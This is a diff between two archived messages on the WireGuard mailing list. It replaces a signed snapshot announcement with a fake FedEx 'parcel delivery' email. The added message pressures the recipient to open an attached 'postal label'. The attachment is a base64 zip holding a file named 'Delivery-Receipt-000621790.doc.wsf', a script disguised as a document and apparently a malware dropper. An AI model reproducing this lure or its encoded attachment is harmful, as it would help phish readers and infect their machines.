@@ -1,22 +1,23 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: kuzeyce@server.pbsbilgisayar.com
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 3de4b987
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 02:41:20 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id d43bf73d
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 02:41:20 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id dfcdbd61
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 02:41:20 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 74ecbcf7
- (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256:NO)
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 02:41:20 +0000 (UTC)
-Date: Thu, 05 Jan 2017 03:50:21 +0100
-To: "WireGuard mailing list" <wireguard@lists.zx2c4.com>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Subject: [ANNOUNCE] Snapshot `0.0.20170105` Available
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 72e853bd
+ for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 10:41:12 +0000 (UTC)
+Received: from server.pbsbilgisayar.com (server.neleryaptik.com
+ [188.132.217.44])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 7565bfb5
+ for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 10:41:12 +0000 (UTC)
+Received: from kuzeyce by server.pbsbilgisayar.com with local (Exim 4.87)
+ (envelope-from <kuzeyce@server.pbsbilgisayar.com>)
+ id 1cP5ca-0000GA-HO
+ for wireguard@lists.zx2c4.com; Thu, 05 Jan 2017 13:50:12 +0300
+To: wireguard@lists.zx2c4.com
+Subject: Parcel 000621790 delivery notification, FedEx
+Date: Thu, 5 Jan 2017 10:50:12 +0000
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Message-Id: <79cef0703bec324a@frisell.zx2c4.com>
+Message-ID: <e3d68170b038546092e6171ce5578fa5@kuzeyce.com>
+From: "FedEx SameDay" <julio.dotson@kuzeyce.com>
+Content-Type: multipart/mixed; boundary="b1_8fd41b8da81b5d3ca7ffe345c89a88e0"
+Reply-To: FedEx SameDay <julio.dotson@kuzeyce.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -26,64 +27,122 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+--b1_8fd41b8da81b5d3ca7ffe345c89a88e0
+Content-Type: text/plain; charset=us-ascii
 
-Hello,
+Dear Customer,
 
-A new snapshot, `0.0.20170105`, has been tagged in the git repository.
+Your parcel was successfully delivered January 01 to FedEx Station, but our courier cound not contact you.
 
-Please note that this snapshot is, like the rest of the project at this point
-in time, experimental, and does not consitute a real release that would be
-considered secure and bug-free. WireGuard is generally thought to be fairly
-stable, and most likely will not crash your computer (though it may).
-However, as this is a pre-release snapshot, it comes with no guarantees, and
-its security is not yet to be depended on; it is not applicable for CVEs.
+Postal label is enclosed to this e-mail. Please check the attachment!
 
-With all that said, if you'd like to test this snapshot out, there are a
-few relevent changes.
-
-== Changes ==
-
-  * tools: add bash completion for wg(8)
-  * tools: add wg-quick
-  * tools: add makefile instructions
-  * tools: add systemd unit and auto-detection
-  
-  This is an all-tools release. The new wg-quick tool
-  could use some testing and exposure, so we're posting
-  this snapshot a bit early to solicit feedback.
-
-As always, the source is available at https://git.zx2c4.com/WireGuard/ and
-information about the project is available at https://www.wireguard.io/ .
-
-This snapshot is available in tarball form here:
-  https://git.zx2c4.com/WireGuard/snapshot/WireGuard-0.0.20170105.tar.xz
-  SHA2-256: 1bd990eeae6fbf599ccddde81caa92770f58623ad9705f875bcfab8254583896
-  BLAKE2b-256: f379135a162e37e1b76a6510396ae9ceeae1f9f6d7b1b1cc198942447b7f5382
-
-If you're a snapshot package maintainer, please bump your package version. If
-you're a user, the WireGuard team welcomes any and all feedback on this latest
-snapshot.
-
-Thank you,
-Jason Donenfeld
+Thank you for your consideration,
+Julio Dotson,
+Parcels Delivery Manager.
 
 
------BEGIN PGP SIGNATURE-----
+--b1_8fd41b8da81b5d3ca7ffe345c89a88e0
+Content-Type: application/zip; name="Delivery-Receipt-000621790.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Delivery-Receipt-000621790.zip
 
-iQJEBAEBCAAuFiEEq5lC5tSkz8NBJiCnSfxwEqXeA64FAlhttEwQHGphc29uQHp4
-MmM0LmNvbQAKCRBJ/HASpd4Drg7iEACrwA/2KuVUi5dxzkrq6Lss1GkNIqpy2ecg
-nXH9A2IhnKv4uuf8oENdmQCEC/1P1kJaWXpV8GitbPAimAYLMfKciqX/Vag9h3XO
-u61pPO+BrqHFjEiZTe8RAA4GAW1Szd8L2JcpCtXqjuau+KcbQKiPXwJaYMX7NH3R
-GqQep+S5fzI4yAVJgf8Lfj0/1CfXtZ7Wgf2hMGagnPN6ihSBWyZCbQHDiSECDoKG
-cSMZRAsEl62c7w+C0qFZYRgTwfIynw3KaiZPyF6dnZ9FtyU9xTBHN5hOjOtVEaDA
-C0NpedM2CvvVx0/tZrNm+ktdBwPbgTM55bPV1gimggmWCrHsb1+EJ63KaHZHhAGn
-dQPkJaqiZ6QB5M/zbUoLS5LyJ6pBSEsdOXZFIXdJ4u2aLFDT4z4vwncUAqWbivdY
-Q9+Xs2aY5YgSD1c/bvifUKWvA/bDd6RLtT3XeV1zlkvV1BCk0gpXwzM0SF86Ce9z
-cA6ov4V6rBKrKt7alQ5yY0Atrb9STkRbldHmUs/iUBFCgV7y1mSqfKBUxdI/0hgO
-4W8NjYR7r13whkk/d19ErrzPZQIq9M8PH149+MlPHJd1E/vL+h0la3g2M+Tj43P7
-Zw2nq7wdUd/heOMJZf7a5TWa6BhfKNqMVYb5JfGqutisJO/ct3zvwhKBJWLgmKxe
-Ig1Ie8kkGg==
-=35v5
------END PGP SIGNATURE-----
+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
+AgACAI4AAADKFAAAAAA=
+
+
+--b1_8fd41b8da81b5d3ca7ffe345c89a88e0--
